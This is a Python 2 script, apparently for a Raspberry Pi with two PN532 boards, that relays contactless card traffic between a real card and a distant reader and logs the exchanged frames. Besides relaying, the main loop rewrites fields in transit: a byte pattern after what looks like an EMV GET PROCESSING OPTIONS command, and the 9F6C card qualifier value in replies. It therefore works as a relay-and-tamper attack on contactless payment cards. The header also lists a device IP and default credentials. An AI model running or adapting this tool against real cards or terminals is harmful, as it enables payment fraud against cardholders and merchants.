#!/usr/bin/python

#
#  pn532mitm.py - NXP PN532 Man-In-The_Middle - log conversations between TAG and external reader
#

'''
IP = 172.16.0.1
pi:raspberry
Initiator must be connected to SPI
Target must be connected to UART
config file:
/etc/nfc/libnfc.conf

allow_autoscan = true
allow_intrusive_scan = false
log_level = 1

device.name = "_PN532_SPI"
device.connstring = "pn532_spi:/dev/spidev0.0:150000"

#device.name = "_PN532_I2c"
#device.connstring = "pn532_i2c:/dev/i2c-1"

device.name = "_PN532_UART"
device.connstring = "pn532_uart:/dev/ttyS0"
'''

from nfc_ctypes import *
from pt_nfc import *
import signal
import time
from pyHex.hexfind import *
import binascii
from apdu_parser import *
import binascii


def signal_handler(signal, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)


def print_line_or_lines(results, indent):
    """short values on same line, multi-line on later ones..."""
    if len(results) == 1:
        print results[0]
    else:
        print
        for result in results:
            print indent + result


def ctypes_pprint(cstruct, indent=""):
    """pretty print a ctypes Structure or Union"""

    for field_name, field_ctype in cstruct._fields_:
        field_value = getattr(cstruct, field_name)
        print indent + field_name,
        next_indent = indent + "    "
        pprint_name = "pprint_%s" % field_name
        pformat_name = "pformat_%s" % field_name
        if hasattr(cstruct, pprint_name):
            # no longer used
            getattr(cstruct, pprint_name)(next_indent)
        elif hasattr(cstruct, pformat_name):
            # counted-array and other common cases
            print_line_or_lines(getattr(cstruct, pformat_name)(), next_indent)
        elif hasattr(field_value, "pformat"):
            # common for small compound types
            print_line_or_lines(field_value.pformat(), next_indent)
        elif hasattr(field_value, "pprint"):
            # useful for Union selectors
            field_value.pprint(next_indent)
        elif hasattr(field_value, "_fields_"):
            # generic recursion
            print
            ctypes_pprint(field_value, next_indent)
        else:
            # generic simple (or unknown/uninteresting) value
            if "c_ubyte_Array" in str(type(field_value)):
                print hexbytes(bytearray(field_value))
            else:
                print field_value  # , "simple print", type(field_value)


def c_ubyte_Array_to_bytearray(a):
    return cast(a, ctypes.c_char_p).value


def print_hex(array_alpha):
    return ''.join(format(x, '02x') for x in array_alpha)


def print_target(target):
    print "\tUID \t:", binascii.hexlify(bytearray(target.nti.nai.abtUid)[:target.nti.nai.szUidLen])
    print "\tATQA\t:", binascii.hexlify(bytearray(target.nti.nai.abtAtqa))
    print "\tSAK \t:", binascii.hexlify(chr(target.nti.nai.btSak))
    print "\tATS \t:", binascii.hexlify(bytearray(target.nti.nai.abtAts)[:target.nti.nai.szAtsLen])


if __name__ == "__main__":
    quitting = False
    # Hardcoded settings:
    time_to_sleep = 0.001  # delay between transactions
    relay_baud = NBR_106  # used by PICC communications
    # relay_baud = NBR_212 # used for mifare classic cards
    # relay_baud = NBR_106 | NBR_212 | NBR_424
    relay_modtype = NMT_ISO14443A
    target_dev_num = 1  # make it command line params
    initiator_dev_num = 0  # make it command line params
    relay_as_bytes = 1  # Relay option as bytes or as bits

    signal.signal(signal.SIGINT, signal_handler)

    # print  sys.argv[0] + " uses libnfc" + get_version() + "\n"
    print "                   *** LibNFC based relay tool ***"
    print "tag <---> initiator (relay) <---> target (relay) <---> original reader\n"

    devs_list = list_devices(True)
    if len(devs_list) < 2:
        print "Founded ", len(devs_list), "... Needed 2.\nExitng..."
        nfc_exit()
        sys.exit()
    else:
        print "Initiator dev num:", initiator_dev_num
        print "Target dev num:", target_dev_num
        print

    # ************* Reader setup *************
    pndReader = NfcInitiator(devs_list[initiator_dev_num])
    # Set tup the various connection fields
    # print "Easy Framing False:", pndReader.configure(NP_EASY_FRAMING, True)
    # print "Easy Framing False:", pndReader.configure(NP_EASY_FRAMING, True)
    # print "Field Down:", pndReader.configure(NP_ACTIVATE_FIELD, False)
    # print "NP_HANDLE_CRC True:", pndReader.configure(NP_HANDLE_CRC, True)
    # print "NP_HANDLE_PARITY True:", pndReader.configure(NP_HANDLE_PARITY, True)
    # print "NP_AUTO_ISO14443_4 True:", pndReader.configure(NP_AUTO_ISO14443_4, True)
    # print "NP_ACCEPT_INVALID_FRAMES False:", pndReader.configure(NP_ACCEPT_INVALID_FRAMES, False)
    # print "NP_FORCE_SPEED_106 False:", pndReader.configure(NP_FORCE_SPEED_106, False)
    # print "Field Up:", pndReader.configure(NP_ACTIVATE_FIELD, True)

    # List targets
    # passive_targets_list = pndReader.initiator_list_passive_targets(relay_modtype, NBR_106 | NBR_212 | NBR_424)
    passive_targets_list = pndReader.initiator_list_passive_targets(relay_modtype, relay_baud)
    print "initiator_list_passive_targets() count:", len(passive_targets_list)
    if len(passive_targets_list) <= 0:
        print "No Tags founded.\nExitng..."
        nfc_exit()
        sys.exit()

    for target in passive_targets_list:
        print "  Tag info:"
        print_target(target)
    print "\nSelecting 1st Tag as source..."

    # real_target = pndReader.initiator_select_passive_target(NMT_ISO14443A, NBR_UNDEFINED)
    print "\n******* Waiting for source Tag *******"
    real_target = pndReader.initiator_select_passive_target(relay_modtype, relay_baud,
                                                            bytearray(passive_targets_list[0].nti.nai.abtUid)[
                                                            :passive_targets_list[0].nti.nai.szUidLen])
    print "Real target:"
    # ctypes_pprint(real_target)
    print_target(real_target)
    # ************* Reader setup end *********

    # ************* Emulator setup ***********
    ## Hardcodes
    # abtAtqa = (ctypes.c_ubyte * 2).from_buffer_copy('\x00\x00')
    # abtUid = (ctypes.c_ubyte * 10).from_buffer_copy('\x08\xad\xbe\xef\x00\x00\x00\x00\x00\x00')
    # abtAts = (ctypes.c_ubyte * 254).from_buffer_copy(254 * '\x00')
    # target_nfc_iso14443a_info = nfc_iso14443a_info(abtAtqa,
    #                                                0x20,
    #                                                4,
    #                                                abtUid,
    #                                                0,
    #                                                abtAts)

    # Get Target info from real target
    target_info = nfc_target_info(real_target.nti.nai)
    target_modulation = nfc_modulation(relay_modtype, relay_baud)
    targettype = nfc_target(target_info, target_modulation)

    emulated_target = nfc_target(target_info, target_modulation);
    # emulated_target.nti.nai.abtAtqa[0] = 0x00;
    # emulated_target.nti.nai.abtAtqa[1] = 0x01;
    emulated_target.nti.nai.abtUid[0] = 0x08;  # Needed for PN532 emulation start
    emulated_target.nti.nai.szUidLen = 0x04;  # Shrink UID to eliminate SEGFAULTs

    # https://de.wikipedia.org/wiki/Answer_to_Select
    # ATS = (05) 75 33 92 03
    #       (TL) T0 TA TB TC
    #             |  |  |  +-- CID supported, NAD supported
    #             |  |  +----- FWI=9 SFGI=2 => FWT=154ms, SFGT=1.21ms
    #             |  +-------- DR=2,4 DS=2,4 => supports 106, 212 & 424bps in both directions
    #             +----------- TA,TB,TC, FSCI=5 => FSC=64
    # It seems hazardous to tell we support NAD if the tag doesn't support NAD but I don't know how to disable it
    # PC/SC pseudo-ATR = 3B 80 80 01 01 if there is no historical bytes

    emulated_target.nti.nai.abtAts[0] = 0x75;
    emulated_target.nti.nai.abtAts[1] = 0x11;  # supports 106 baud only if ATS presented on source
    emulated_target.nti.nai.abtAts[2] = 0x92;
    emulated_target.nti.nai.abtAts[3] = 0x03;
    # if real_target.nti.nai.szAtsLen < 4:
    #     emulated_target.nti.nai.szAtsLen = 0x04;
    # emulated_target.nti.nai.szAtsLen = 0x00;

    print "Emulated target:"
    # ctypes_pprint(emulated_target)
    print_target(emulated_target)
    print "********* Waiting for reader *********\n"
    pndTag = NfcTarget(devs_list[target_dev_num], emulated_target)
    # print "Field Down:", pndTag.configure(NP_ACTIVATE_FIELD, False)
    # print "NP_HANDLE_CRC True:", pndTag.configure(NP_HANDLE_CRC, True)
    # print "NP_HANDLE_PARITY True:", pndTag.configure(NP_HANDLE_PARITY, False)
    # print "NP_FORCE_SPEED_106 True:", pndTag.configure(NP_FORCE_SPEED_106, False)
    # print "NP_AUTO_ISO14443_4 True:", pndTag.configure(NP_AUTO_ISO14443_4, True)
    print "NP_ACCEPT_INVALID_FRAMES True:", pndTag.configure(NP_ACCEPT_INVALID_FRAMES, True)
    # print "NP_ACCEPT_INVALID_FRAMES True:", pndTag.configure(NP_ACCEPT_MULTIPLE_FRAMES, True)
    # print "NP_FORCE_ISO14443_A True:", pndTag.configure(NP_FORCE_ISO14443_A, True)
    # print "Field Up:", pndTag.configure(NP_ACTIVATE_FIELD, True)
    # ************* Reader setup end *********
    print "Done, relaying frames now...\n"

    bytes_log = []
    if relay_as_bytes:
        # Relaying as bytes
        while not quitting:
            #print str(time.time())
            time.sleep(time_to_sleep)
            target_recvd, target_ret = pndTag.target_receive_bytes()
            # print "Bytes to Tag:", len(target_recvd), "==", int(target_ret), "\n", hexdump(target_recvd)
            bytes_log.append((target_recvd, target_ret))
            if target_ret <= NFC_SUCCESS:
                print "Receive result:", "(", target_ret, ")", sErrorMessages[target_ret]
                quitting = True
                continue

            time.sleep(time_to_sleep)
            if (len(target_recvd)>4):
                cmd = binascii.hexlify(target_recvd[0]+target_recvd[1]+target_recvd[2]+target_recvd[3])
            if (cmd=='80a80000'): # (cmd=='77128202'):
                print "replace "+binascii.hexlify(target_recvd)+" to "+binascii.hexlify(target_recvd).replace("e040","a040")
                target_recvd = binascii.unhexlify(binascii.hexlify(target_recvd).replace("e040","a040"))
                
            reader_recvd, reader_ret = pndReader.initiator_transceive_bytes(target_recvd)
            bytes_log.append((reader_recvd, reader_ret))
            if reader_ret <= NFC_SUCCESS:
                print "Transceive result:", "(", reader_ret, ")", sErrorMessages[reader_ret]
                quitting = True
                continue
            time.sleep(time_to_sleep)
            cmd = ''
            if (len(reader_recvd)>4):
                cmd = binascii.hexlify(reader_recvd[0]+reader_recvd[1]+reader_recvd[2]+reader_recvd[3])
                cmd2 = binascii.hexlify(reader_recvd[2]+reader_recvd[3])
            if (cmd2=='8202'):
                print "replace "+binascii.hexlify(reader_recvd)+" to "+binascii.hexlify(reader_recvd).replace("9f6c023800","9f6c020180")
                reader_recvd = binascii.unhexlify(binascii.hexlify(reader_recvd).replace("9f6c023800","9f6c020180"))           
            ret = pndTag.target_send_bytes(reader_recvd)
            if ret <= NFC_SUCCESS:
                print "Send result:", "(", ret, ")", sErrorMessages[ret]
                quitting = True
                continue


    else:
        bytes_log = []
        # Relaying as bits
        while not quitting:
            time.sleep(time_to_sleep)
            target_recvd, target_ret, target_pbytes = pndTag.target_receive_bits()
            bytes_log.append((target_recvd, target_ret, target_pbytes))
            if target_ret <= NFC_SUCCESS:
                print "Receive result:", "(", target_ret, ")", sErrorMessages[target_ret]
                quitting = True
                continue

            time.sleep(time_to_sleep)
            reader_recvd, reader_ret, reader_pbytes = pndReader.initiator_transceive_bits(target_recvd, target_ret,
                                                                                          target_pbytes)
            bytes_log.append((reader_recvd, reader_ret, reader_pbytes))
            if reader_ret <= NFC_SUCCESS:
                print "Transceive result:", "(", reader_ret, ")", sErrorMessages[reader_ret]
                quitting = True
                continue

            time.sleep(time_to_sleep)
            ret = pndTag.target_send_bits(reader_recvd, reader_ret, reader_pbytes)
            if ret <= NFC_SUCCESS:
                print "Send result:", "(", ret, ")", sErrorMessages[ret]
                quitting = True
                continue

    # command_descriptions = parse_description_file("command_descriptions.txt")
    # response_descriptions = parse_description_file("response_descriptions.txt")

    print "\n************** Log Out ***************"
    transaction_cnt = 1
    for msg in bytes_log:
        print transaction_cnt, ": Bytes:", len(msg[0]), "==", int(msg[1]), "\n", hexdump(msg[0])
        apdu_line = hexbytes(msg[0])
        # print "!!!", apdu_line
        if int(msg[1]) > 0:
            if transaction_cnt% 2 != 0:
                print "Request:"
                # desc, cla, ins, p1, p2, lc, le, data = parse_apdu_command(apdu_line, command_descriptions)
                # show_apdu_command(desc, cla, ins, p1, p2, lc, le, data, None)
                # last_apdu_command = apdu_line
            else:
                print "Response:"
                # desc, category, sw1, sw2, data = parse_apdu_response(apdu_line, response_descriptions, last_apdu_command)
                # show_apdu_response(desc, category, sw1, sw2, data, None)

        transaction_cnt += 1

    print 'Ending now ...'
    nfc_exit()
